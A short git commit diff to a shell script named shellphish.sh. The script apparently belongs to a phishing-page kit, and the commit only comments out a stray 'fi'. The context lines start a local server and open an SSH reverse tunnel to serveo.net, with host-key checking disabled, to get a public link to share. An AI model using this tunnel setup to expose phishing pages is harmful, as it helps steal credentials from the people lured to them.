0d611f189655552365a37ac09b085e52d0a109f8
serflash <44881861+serflash@users.noreply.github.com>
2020-05-14 15:52:00 +0300

    Update shellphish.sh

--- shellphish.sh
+++ shellphish.sh
@@ -308,7 +308,7 @@ printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
 #if [[ -e sendlink ]]; then
 #rm -rf sendlink
-fi
+#fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10
